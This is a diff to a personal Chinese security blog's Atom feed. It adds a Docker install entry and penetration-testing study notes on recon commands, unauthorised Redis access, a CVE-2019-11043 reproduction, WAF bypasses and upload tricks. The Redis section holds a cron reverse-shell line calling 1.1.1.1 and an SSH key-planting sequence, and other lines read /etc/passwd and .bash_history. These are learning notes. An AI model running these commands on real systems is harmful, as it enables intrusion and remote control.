@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-09-21T13:09:48.034Z</updated>
+  <updated>2020-10-28T11:16:44.074Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,47 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>docker安装</title>
+    <link href="http://yoursite.com/2020/10/28/docker%E5%AE%89%E8%A3%85/"/>
+    <id>http://yoursite.com/2020/10/28/docker%E5%AE%89%E8%A3%85/</id>
+    <published>2020-10-28T08:07:37.000Z</published>
+    <updated>2020-10-28T11:16:44.074Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"> </span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br><span class="line"> </span><br><span class="line">apt-get install dirmngr</span><br><span class="line"></span><br><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &apos;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&apos; | sudo tee /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt install docker-ce</span><br><span class="line"></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line">apt install docker-compose</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>看书笔记</title>
+    <link href="http://yoursite.com/2020/10/28/%E7%9C%8B%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    <id>http://yoursite.com/2020/10/28/%E7%9C%8B%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
+    <published>2020-10-28T06:40:09.059Z</published>
+    <updated>2020-10-29T09:27:38.399Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>title: 看书笔记<br>date: 2020-10-28 14:40:09<br>tags:<br>categories: 笔记</p><h1 id="安恒信息《渗透攻击红队百科全书》"><a href="#安恒信息《渗透攻击红队百科全书》" class="headerlink" title="安恒信息《渗透攻击红队百科全书》"></a>安恒信息《渗透攻击红队百科全书》</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv   检查当前shell权限</span><br><span class="line">systeminfo   查看系统信息</span><br><span class="line">netstat -ano   网络连接状态信息</span><br><span class="line">hostname    机器名</span><br><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list   查杀软</span><br><span class="line">quser   查在线用户</span><br><span class="line">tasklist /v   查看进程</span><br><span class="line">net config workstation   查看当前域</span><br><span class="line">net user   查看用户帐号列表</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="windows-域"><a href="#windows-域" class="headerlink" title="windows(域)"></a>windows(域)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user /do   用户列表</span><br><span class="line">net group &quot;domain admins&quot; /domain   域管理员列表</span><br><span class="line">net group &quot;domain controllers&quot; /domain 域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; /domain 域机器</span><br><span class="line">net group /domain 域内工作组</span><br><span class="line">net config workstation   查看当前域</span><br><span class="line">net view   同一域内机器列表</span><br><span class="line">net view \\ip     查看ip共享</span><br><span class="line">net view /domain   查看内网存在多少域</span><br><span class="line">net view /domain:xyz   查看xyz域中的机器列表</span><br></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami   权限</span><br><span class="line">ifconfig    网卡和ip</span><br><span class="line">netstat -anpt   端口</span><br><span class="line">ps -ef  进程状态</span><br><span class="line">cat /root/.bash_history   历史输入命令</span><br><span class="line">find / -name *.cfg   查找配置文件</span><br></pre></td></tr></table></figure><h3 id="wmic使用"><a href="#wmic使用" class="headerlink" title="wmic使用"></a>wmic使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/？  获得帮助</span><br><span class="line">wmic process get caption,executablepath,processid  查看进程</span><br><span class="line">wmic product get name   安装软件情况</span><br><span class="line">wmic environment get description,variablevalue  环境变量</span><br></pre></td></tr></table></figure><h3 id="内网横向常见端口"><a href="#内网横向常见端口" class="headerlink" title="内网横向常见端口"></a>内网横向常见端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">445  smb</span><br><span class="line">net use \\192.168.1.2   空会话</span><br><span class="line">net use \\192.168.1.2 /user:a\username password   远程本地认证</span><br><span class="line">a\username中a为工作组下的机器命名  例如  workgroup\username</span><br><span class="line">137 138 139 </span><br><span class="line">137 138为udp端口   主要内网文件传输   netbios/smb服务主要是139</span><br><span class="line">135 主要做wmi管理工具的远程操作</span><br><span class="line">53  dns端口   内网中可以用dns进行通信传输  dns隧道</span><br><span class="line">88  主要开启kerberos服务</span><br></pre></td></tr></table></figure><h2 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=smb-vuln-ms17-010 192.168.117.130</span><br></pre></td></tr></table></figure><h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 172.16.143.1 -p 6379</span><br></pre></td></tr></table></figure><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir xxx</span><br><span class="line">set foobar &quot;xxxxxxxxx&quot;</span><br><span class="line">config set dbfilename xxxxxx</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="日志反弹shell"><a href="#日志反弹shell" class="headerlink" title="日志反弹shell"></a>日志反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set shell &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/88 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="写公钥"><a href="#写公钥" class="headerlink" title="写公钥"></a>写公钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa xxxxxx root@kali\n\n\n&quot;</span><br><span class="line">save</span><br><span class="line">ssh -i /root/.ssh/id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure><h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><h3 id="其他非授权访问漏洞"><a href="#其他非授权访问漏洞" class="headerlink" title="其他非授权访问漏洞"></a>其他非授权访问漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jenkins 8080</span><br><span class="line">mongodb 28017</span><br><span class="line">zookeeper 2181 2171</span><br><span class="line">elasticsearch 9200</span><br><span class="line">memcache 11211</span><br></pre></td></tr></table></figure><h2 id="cve-2019-11043-php远程代码执行复现"><a href="#cve-2019-11043-php远程代码执行复现" class="headerlink" title="cve-2019-11043 php远程代码执行复现"></a>cve-2019-11043 php远程代码执行复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">docker-compose up -d</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line">go get -v &amp;&amp; go build</span><br><span class="line">go run . &quot;http://127.0.0.1:8080/index.php&quot;</span><br><span class="line">http://127.0.0.1:8080/index.php?a=id</span><br></pre></td></tr></table></figure><h2 id="bypasswaf"><a href="#bypasswaf" class="headerlink" title="bypasswaf"></a>bypasswaf</h2><h3 id="绕过云waf"><a href="#绕过云waf" class="headerlink" title="绕过云waf"></a>绕过云waf</h3><h4 id="找真实ip-绕过cdn"><a href="#找真实ip-绕过cdn" class="headerlink" title="找真实ip 绕过cdn"></a>找真实ip 绕过cdn</h4><p>dns历史解析记录</p><p>rss邮箱订阅，查看邮件源码</p><p>国外ping</p><p>子域名</p><h4 id="https降级绕过"><a href="#https降级绕过" class="headerlink" title="https降级绕过"></a>https降级绕过</h4><h4 id="method绕过"><a href="#method绕过" class="headerlink" title="method绕过"></a>method绕过</h4><h4 id="header-ip绕过"><a href="#header-ip绕过" class="headerlink" title="header ip绕过"></a>header ip绕过</h4><h4 id="headercontent-type绕过"><a href="#headercontent-type绕过" class="headerlink" title="headercontent-type绕过"></a>headercontent-type绕过</h4><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="单引号和反斜杠"><a href="#单引号和反斜杠" class="headerlink" title="单引号和反斜杠"></a>单引号和反斜杠</h4><p>echo ‘o’r’l’e’v’e’n’</p><p>/b\i\n/c\at /et’c’/pa’s’swd</p><h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="? *  通配符绕过"></a>? *  通配符绕过</h4><p>/b??/c?t /etc/pass*d</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">文件名加回车</span><br><span class="line"></span><br><span class="line">shell.php(%80-%99).jpg</span><br><span class="line"></span><br><span class="line">先上传再改名</span><br><span class="line"></span><br><span class="line">%00</span><br><span class="line"></span><br><span class="line">00(hex)</span><br><span class="line"></span><br><span class="line">长文件名(windows 258byte |linux 4096 byte)</span><br></pre></td></tr></table></figure><h3 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h3><p>利用ntfs ads </p><table><thead><tr><th align="left">上传文件名</th><th>服务器表面生成</th><th>文件内容</th></tr></thead><tbody><tr><td align="left">Test.php:a.jpg</td><td>Test.php</td><td>空</td></tr><tr><td align="left">Test.php::$DATA</td><td>test.php</td><td><?php phpinfo;?></td></tr><tr><td align="left">Test.php::$INDEX_ALLOCATION</td><td>test.php文件夹</td><td></td></tr><tr><td align="left">Test.php::$DATA.jpg</td><td>0.jpg</td><td><?php phpinfo;?></td></tr><tr><td align="left">Test.php::$DATA\aaa.jpg</td><td>aaa.jpg</td><td><?php phpinfo;?></td></tr></tbody></table><h2 id="用phpmyadmin去getshell"><a href="#用phpmyadmin去getshell" class="headerlink" title="用phpmyadmin去getshell"></a>用phpmyadmin去getshell</h2>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;&lt;p&gt;title: 看书笔记&lt;br&gt;date: 2020-10-28 14:40:09&lt;br&gt;tags:&lt;br&gt;categories: 笔记&lt;/p&gt;&lt;h1 id=&quot;安恒信息《渗透攻击红队百科全书》&quot;&gt;&lt;a href=&quot;#安恒信息《渗透攻击红队百科全书》&quot; class=&quot;headerlink&quot; title=&quot;安恒信息《渗透攻击红队百科全书》&quot;&gt;&lt;/a&gt;安恒信息《渗透攻击红队百科全书》&lt;/h1&gt;&lt;h2 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h2&gt;&lt;h3 id=&quot;windows&quot;&gt;&lt;a href=&quot;#windows&quot; class=&quot;headerlink&quot; title=&quot;windows&quot;&gt;&lt;/a&gt;windows&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;whoami /user &amp;amp;&amp;amp; whoami /priv   检查当前shell权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systeminfo   查看系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netstat -ano   网络连接状态信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hostname    机器名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list   查杀软&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;quser   查在线用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tasklist /v   查看进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net config workstation   查看当前域&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net user   查看用户帐号列表&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>docker逃逸</title>
@@ -409,51 +450,6 @@
       
         &lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/192012.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP mt_rand安全杂谈及应用场景详解&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.open
       
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>bypass open_basedir</title>
-    <link href="http://yoursite.com/2020/05/11/bypass-open-basedir/"/>
-    <id>http://yoursite.com/2020/05/11/bypass-open-basedir/</id>
-    <published>2020-05-11T03:34:45.000Z</published>
-    <updated>2020-09-26T05:18:42.877Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4720&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bypass open_basedir的新方法&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://skysec.top/2019/04/
-      
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>一些不包含数字和字母的webshell</title>
-    <link href="http://yoursite.com/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
-    <id>http://yoursite.com/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</id>
-    <published>2020-05-11T03:33:18.000Z</published>
-    <updated>2020-09-08T11:20:28.164Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p> <a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104631142</a> </p><a id="more"></a><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法)</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一些不包含数字和字母的webshell&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)&lt;/a&gt;&lt;/p&gt;&lt;p&gt; &lt;a href=&quot;https://blog.csdn.net/mochu7777777/article/details/104631142&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/mochu7777777/article/details/104631142&lt;/a&gt; &lt;/p&gt;
     
     </summary>
     
